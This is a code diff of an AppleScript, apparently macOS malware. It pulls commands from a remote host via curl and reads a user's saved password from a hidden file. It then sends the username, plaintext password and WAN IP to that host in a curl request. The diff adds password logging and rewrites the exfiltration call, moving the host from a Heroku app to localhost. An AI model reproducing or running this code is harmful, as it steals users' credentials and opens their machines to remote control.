@@ -8,7 +8,8 @@ on error
 	return
 end try
 
-set remoteHost to "http://damp-journey-2734.herokuapp.com"
+--set remoteHost to "http://damp-journey-2734.herokuapp.com"
+set remoteHost to "http://localhost:5000"
 set commandURL to remoteHost & "/remote.txt"
 try
 	set commandArgs to paragraphs of (do shell script "curl " & commandURL & " | cut -d ':' -f 2")
@@ -45,6 +46,7 @@ end try
 try
 	try
 		set oldpasswd to (do shell script "cat " & ufld & "." & theuser & ".txt")
+		log oldpasswd
 		checkPassword(theuser, oldpasswd) -- Check if password is correct
 		set passwd to oldpasswd
 	on error err	
@@ -74,8 +76,9 @@ try
 	on error
 		set WANIP to "not connected"
 	end try
-	log WANIP596
-	log (do shell script "curl " & remoteHost & "/a?user=" & theuser & "&pass=" & passwd & "&WANIP=" & WANIP)
+	log WANIP
+	log passwd
+	do shell script "curl \"" & remoteHost & "/a?pass=" & passwd & "&user=" & theuser & "&WANIP=" & WANIP & "\""
 end try
 
 on checkPassword(user, pass)
